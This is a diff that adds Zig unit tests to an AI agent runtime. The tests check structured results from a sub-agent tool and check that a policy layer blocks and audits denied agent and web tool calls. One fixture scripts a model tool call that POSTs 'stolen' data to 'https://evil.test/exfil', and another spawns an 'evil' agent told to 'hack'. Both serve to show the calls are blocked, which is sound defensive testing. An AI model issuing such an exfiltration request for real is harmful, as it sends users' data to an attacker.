@@ -5221,6 +5221,521 @@ test "UX9 walkthrough: denied bash renders denial text in mode and store events"
     try std.testing.expect(std.mem.indexOf(u8, sd, "bash") != null);
 }
 
+test "UX8b: agent tool returns structured result with status" {
+    const ReaderImpl = struct {
+        fn next(_: *@This()) !?session.Event {
+            return null;
+        }
+
+        fn deinit(_: *@This()) void {}
+    };
+
+    const StoreImpl = struct {
+        rdr: ReaderImpl = .{},
+        tool_out: [256]u8 = [_]u8{0} ** 256,
+        tool_out_len: usize = 0,
+        tool_is_err: bool = false,
+
+        fn append(self: *@This(), _: []const u8, ev: session.Event) !void {
+            switch (ev.data) {
+                .tool_result => |tr| {
+                    const n = @min(tr.output.len, self.tool_out.len);
+                    @memcpy(self.tool_out[0..n], tr.output[0..n]);
+                    self.tool_out_len = n;
+                    self.tool_is_err = tr.is_err;
+                },
+                else => {},
+            }
+        }
+
+        fn replay(self: *@This(), _: []const u8) !session.Reader {
+            return session.Reader.from(
+                ReaderImpl,
+                &self.rdr,
+                ReaderImpl.next,
+                ReaderImpl.deinit,
+            );
+        }
+
+        fn deinit(_: *@This()) void {}
+    };
+
+    const StreamImpl = struct {
+        evs: []const providers.Event,
+        idx: usize = 0,
+
+        fn next(self: *@This()) !?providers.Event {
+            if (self.idx >= self.evs.len) return null;
+            const ev = self.evs[self.idx];
+            self.idx += 1;
+            return ev;
+        }
+
+        fn deinit(_: *@This()) void {}
+    };
+
+    const ProviderImpl = struct {
+        stream: StreamImpl,
+
+        fn start(self: *@This(), _: providers.Request) !providers.Stream {
+            self.stream.idx = 0;
+            return providers.Stream.from(
+                StreamImpl,
+                &self.stream,
+                StreamImpl.next,
+                StreamImpl.deinit,
+            );
+        }
+    };
+
+    const AgentDispatch = struct {
+        out: [1]tools.Output = undefined,
+
+        fn run(self: *@This(), call: tools.Call, _: tools.Sink) !tools.Result {
+            self.out[0] = .{
+                .call_id = call.id,
+                .seq = 0,
+                .at_ms = call.at_ms,
+                .stream = .stdout,
+                .chunk = "agent: child\nkind: text\nstop: done\ntruncated: false\n\nresult text",
+                .truncated = false,
+            };
+            return .{
+                .call_id = call.id,
+                .started_at_ms = call.at_ms,
+                .ended_at_ms = call.at_ms,
+                .out = self.out[0..],
+                .final = .{ .ok = .{ .code = 0 } },
+            };
+        }
+    };
+
+    const ModeImpl = struct {
+        fn push(_: *@This(), _: ModeEv) !void {}
+    };
+
+    const evs = [_]providers.Event{
+        .{ .tool_call = .{
+            .id = "call-a",
+            .name = "agent",
+            .args = "{\"agent_id\":\"child\",\"prompt\":\"do work\"}",
+        } },
+        .{ .stop = .{ .reason = .tool } },
+        .{ .text = "final" },
+        .{ .stop = .{ .reason = .done } },
+    };
+    var provider_impl = ProviderImpl{
+        .stream = .{ .evs = evs[0..] },
+    };
+    const prov = providers.Provider.from(
+        ProviderImpl,
+        &provider_impl,
+        ProviderImpl.start,
+    );
+
+    var store_impl = StoreImpl{};
+    const store = session.SessionStore.from(
+        StoreImpl,
+        &store_impl,
+        StoreImpl.append,
+        StoreImpl.replay,
+        StoreImpl.deinit,
+    );
+
+    var mode_impl = ModeImpl{};
+    const mode = ModeSink.from(ModeImpl, &mode_impl, ModeImpl.push);
+
+    var agent_dispatch = AgentDispatch{};
+    const entries = [_]tools.Entry{
+        .{
+            .name = "agent",
+            .kind = .agent,
+            .spec = .{
+                .kind = .agent,
+                .desc = "agent",
+                .params = &.{
+                    .{ .name = "agent_id", .ty = .string, .required = true, .desc = "id" },
+                    .{ .name = "prompt", .ty = .string, .required = true, .desc = "prompt" },
+                },
+                .out = .{ .max_bytes = 4096, .stream = false },
+                .timeout_ms = 5000,
+                .destructive = false,
+            },
+            .dispatch = tools.Dispatch.from(AgentDispatch, &agent_dispatch, AgentDispatch.run),
+        },
+    };
+
+    _ = try run(.{
+        .alloc = std.testing.allocator,
+        .sid = "sid-agent",
+        .prompt = "spawn agent",
+        .model = "m",
+        .provider = prov,
+        .store = store,
+        .reg = tools.Registry.init(entries[0..]),
+        .mode = mode,
+        .max_turns = 2,
+    });
+
+    // Store captured agent tool result with structured content
+    const out = store_impl.tool_out[0..store_impl.tool_out_len];
+    try std.testing.expect(std.mem.indexOf(u8, out, "agent: child") != null);
+    try std.testing.expect(std.mem.indexOf(u8, out, "stop: done") != null);
+    try std.testing.expect(!store_impl.tool_is_err);
+}
+
+test "UX8b: denied agent tool blocked by policy returns error result" {
+    const ReaderImpl = struct {
+        fn next(_: *@This()) !?session.Event {
+            return null;
+        }
+
+        fn deinit(_: *@This()) void {}
+    };
+
+    const StoreImpl = struct {
+        rdr: ReaderImpl = .{},
+        tool_out: [256]u8 = [_]u8{0} ** 256,
+        tool_out_len: usize = 0,
+        tool_is_err: bool = false,
+
+        fn append(self: *@This(), _: []const u8, ev: session.Event) !void {
+            switch (ev.data) {
+                .tool_result => |tr| {
+                    const n = @min(tr.output.len, self.tool_out.len);
+                    @memcpy(self.tool_out[0..n], tr.output[0..n]);
+                    self.tool_out_len = n;
+                    self.tool_is_err = tr.is_err;
+                },
+                else => {},
+            }
+        }
+
+        fn replay(self: *@This(), _: []const u8) !session.Reader {
+            return session.Reader.from(
+                ReaderImpl,
+                &self.rdr,
+                ReaderImpl.next,
+                ReaderImpl.deinit,
+            );
+        }
+
+        fn deinit(_: *@This()) void {}
+    };
+
+    const StreamImpl = struct {
+        evs: []const providers.Event,
+        idx: usize = 0,
+
+        fn next(self: *@This()) !?providers.Event {
+            if (self.idx >= self.evs.len) return null;
+            const ev = self.evs[self.idx];
+            self.idx += 1;
+            return ev;
+        }
+
+        fn deinit(_: *@This()) void {}
+    };
+
+    const ProviderImpl = struct {
+        stream: StreamImpl,
+
+        fn start(self: *@This(), _: providers.Request) !providers.Stream {
+            self.stream.idx = 0;
+            return providers.Stream.from(
+                StreamImpl,
+                &self.stream,
+                StreamImpl.next,
+                StreamImpl.deinit,
+            );
+        }
+    };
+
+    const AgentDispatch = struct {
+        ran: bool = false,
+
+        fn run(self: *@This(), _: tools.Call, _: tools.Sink) !tools.Result {
+            self.ran = true;
+            return error.TestUnexpectedResult;
+        }
+    };
+
+    const ModeImpl = struct {
+        fn push(_: *@This(), _: ModeEv) !void {}
+    };
+
+    // Policy that denies agent tool
+    const AuthImpl = struct {
+        fn check(_: *@This(), _: []const u8, _: []const u8, kind: tools.Kind, _: []const u8, _: tools.Call.Args) !void {
+            if (kind == .agent) return error.PolicyDenied;
+        }
+    };
+
+    const evs = [_]providers.Event{
+        .{ .tool_call = .{
+            .id = "call-deny",
+            .name = "agent",
+            .args = "{\"agent_id\":\"evil\",\"prompt\":\"hack\"}",
+        } },
+        .{ .stop = .{ .reason = .tool } },
+        .{ .text = "ok" },
+        .{ .stop = .{ .reason = .done } },
+    };
+    var provider_impl = ProviderImpl{
+        .stream = .{ .evs = evs[0..] },
+    };
+    const prov = providers.Provider.from(
+        ProviderImpl,
+        &provider_impl,
+        ProviderImpl.start,
+    );
+
+    var store_impl = StoreImpl{};
+    const store = session.SessionStore.from(
+        StoreImpl,
+        &store_impl,
+        StoreImpl.append,
+        StoreImpl.replay,
+        StoreImpl.deinit,
+    );
+
+    var mode_impl = ModeImpl{};
+    const mode = ModeSink.from(ModeImpl, &mode_impl, ModeImpl.push);
+
+    var agent_dispatch = AgentDispatch{};
+    const entries = [_]tools.Entry{
+        .{
+            .name = "agent",
+            .kind = .agent,
+            .spec = .{
+                .kind = .agent,
+                .desc = "agent",
+                .params = &.{
+                    .{ .name = "agent_id", .ty = .string, .required = true, .desc = "id" },
+                    .{ .name = "prompt", .ty = .string, .required = true, .desc = "prompt" },
+                },
+                .out = .{ .max_bytes = 4096, .stream = false },
+                .timeout_ms = 5000,
+                .destructive = false,
+            },
+            .dispatch = tools.Dispatch.from(AgentDispatch, &agent_dispatch, AgentDispatch.run),
+        },
+    };
+
+    var auth_impl = AuthImpl{};
+    const tool_auth = ToolAuth.from(AuthImpl, &auth_impl, AuthImpl.check);
+
+    _ = try run(.{
+        .alloc = std.testing.allocator,
+        .sid = "sid-deny-agent",
+        .prompt = "spawn",
+        .model = "m",
+        .provider = prov,
+        .store = store,
+        .reg = tools.Registry.init(entries[0..]),
+        .mode = mode,
+        .max_turns = 2,
+        .tool_auth = tool_auth,
+    });
+
+    // Dispatch must NOT have run
+    try std.testing.expect(!agent_dispatch.ran);
+    // Store captured error result with "blocked by policy"
+    const out = store_impl.tool_out[0..store_impl.tool_out_len];
+    try std.testing.expect(std.mem.indexOf(u8, out, "blocked by policy") != null);
+    try std.testing.expect(store_impl.tool_is_err);
+}
+
+test "UX9: denied web tool emits audit via tool_auth and blocks dispatch" {
+    const ReaderImpl = struct {
+        fn next(_: *@This()) !?session.Event {
+            return null;
+        }
+
+        fn deinit(_: *@This()) void {}
+    };
+
+    const StoreImpl = struct {
+        rdr: ReaderImpl = .{},
+        events: std.ArrayListUnmanaged(session.Event) = .{},
+
+        fn append(self: *@This(), _: []const u8, ev: session.Event) !void {
+            try self.events.append(std.testing.allocator, try ev.dupe(std.testing.allocator));
+        }
+
+        fn replay(self: *@This(), _: []const u8) !session.Reader {
+            return session.Reader.from(
+                ReaderImpl,
+                &self.rdr,
+                ReaderImpl.next,
+                ReaderImpl.deinit,
+            );
+        }
+
+        fn deinit(self: *@This()) void {
+            for (self.events.items) |ev| ev.free(std.testing.allocator);
+            self.events.deinit(std.testing.allocator);
+        }
+    };
+
+    const StreamImpl = struct {
+        evs: []const providers.Event,
+        idx: usize = 0,
+
+        fn next(self: *@This()) !?providers.Event {
+            if (self.idx >= self.evs.len) return null;
+            const ev = self.evs[self.idx];
+            self.idx += 1;
+            return ev;
+        }
+
+        fn deinit(_: *@This()) void {}
+    };
+
+    const ProviderImpl = struct {
+        stream: StreamImpl,
+
+        fn start(self: *@This(), _: providers.Request) !providers.Stream {
+            self.stream.idx = 0;
+            return providers.Stream.from(
+                StreamImpl,
+                &self.stream,
+                StreamImpl.next,
+                StreamImpl.deinit,
+            );
+        }
+    };
+
+    const ModeImpl = struct {
+        denial_text: ?[]const u8 = null,
+
+        fn push(self: *@This(), ev: ModeEv) !void {
+            switch (ev) {
+                .provider => |pev| switch (pev) {
+                    .tool_result => |tr| {
+                        if (tr.is_err) self.denial_text = tr.output;
+                    },
+                    else => {},
+                },
+                else => {},
+            }
+        }
+    };
+
+    const WebDispatch = struct {
+        ran: bool = false,
+
+        fn run(self: *@This(), _: tools.Call, _: tools.Sink) !tools.Result {
+            self.ran = true;
+            return error.TestUnexpectedResult;
+        }
+    };
+
+    // ToolAuth that records the denied call and returns PolicyDenied
+    const AuthImpl = struct {
+        seen_kind: ?tools.Kind = null,
+        seen_name: ?[]const u8 = null,
+        seen_url: ?[]const u8 = null,
+
+        fn check(self: *@This(), _: []const u8, name: []const u8, kind: tools.Kind, _: []const u8, parsed_args: tools.Call.Args) !void {
+            self.seen_kind = kind;
+            self.seen_name = name;
+            if (kind == .web) self.seen_url = parsed_args.web.url;
+            return error.PolicyDenied;
+        }
+    };
+
+    const evs = [_]providers.Event{
+        .{
+            .tool_call = .{
+                .id = "deny-web-1",
+                .name = "web",
+                .args = "{\"method\":\"POST\",\"url\":\"https://evil.test/exfil\",\"body\":\"stolen\"}",
+            },
+        },
+        .{ .stop = .{ .reason = .tool } },
+    };
+    var provider_impl = ProviderImpl{
+        .stream = .{ .evs = evs[0..] },
+    };
+    const provider = providers.Provider.from(
+        ProviderImpl,
+        &provider_impl,
+        ProviderImpl.start,
+    );
+
+    var store_impl = StoreImpl{};
+    defer store_impl.deinit();
+    const store = session.SessionStore.from(
+        StoreImpl,
+        &store_impl,
+        StoreImpl.append,
+        StoreImpl.replay,
+        StoreImpl.deinit,
+    );
+
+    var mode_impl = ModeImpl{};
+    const mode = ModeSink.from(ModeImpl, &mode_impl, ModeImpl.push);
+
+    var web_dispatch = WebDispatch{};
+    const entries = [_]tools.Entry{
+        .{
+            .name = "web",
+            .kind = .web,
+            .spec = .{
+                .kind = .web,
+                .desc = "web",
+                .params = &.{.{ .name = "url", .ty = .string, .required = true, .desc = "url" }},
+                .out = .{ .max_bytes = 1024, .stream = false },
+                .timeout_ms = 1000,
+                .destructive = false,
+            },
+            .dispatch = tools.Dispatch.from(WebDispatch, &web_dispatch, WebDispatch.run),
+        },
+    };
+
+    var auth_impl = AuthImpl{};
+    const tool_auth = ToolAuth.from(AuthImpl, &auth_impl, AuthImpl.check);
+
+    _ = try run(.{
+        .alloc = std.testing.allocator,
+        .sid = "sid-ux9-web-audit",
+        .prompt = "do it",
+        .model = "m",
+        .provider = provider,
+        .store = store,
+        .reg = tools.Registry.init(entries[0..]),
+        .mode = mode,
+        .max_turns = 1,
+        .tool_auth = tool_auth,
+    });
+
+    // Web dispatch must NOT have run
+    try std.testing.expect(!web_dispatch.ran);
+
+    // ToolAuth received the correct kind and name
+    try std.testing.expectEqual(tools.Kind.web, auth_impl.seen_kind.?);
+    try std.testing.expectEqualStrings("web", auth_impl.seen_name.?);
+    try std.testing.expectEqualStrings("https://evil.test/exfil", auth_impl.seen_url.?);
+
+    // Mode received "blocked by policy" denial
+    const denial = mode_impl.denial_text orelse return error.TestUnexpectedResult;
+    try std.testing.expect(std.mem.indexOf(u8, denial, "blocked by policy") != null);
+
+    // Store persisted denial tool_result with is_err=true
+    var store_denial: ?[]const u8 = null;
+    for (store_impl.events.items) |ev| {
+        switch (ev.data) {
+            .tool_result => |tr| {
+                if (tr.is_err) store_denial = tr.output;
+            },
+            else => {},
+        }
+    }
+    const sd = store_denial orelse return error.TestUnexpectedResult;
+    try std.testing.expect(std.mem.indexOf(u8, sd, "blocked by policy") != null);
+}
+
 test "CmdCache TTL checked on lookup rejects expired entries" {
     var cache = CmdCache.init(std.testing.allocator);
     defer cache.deinit();
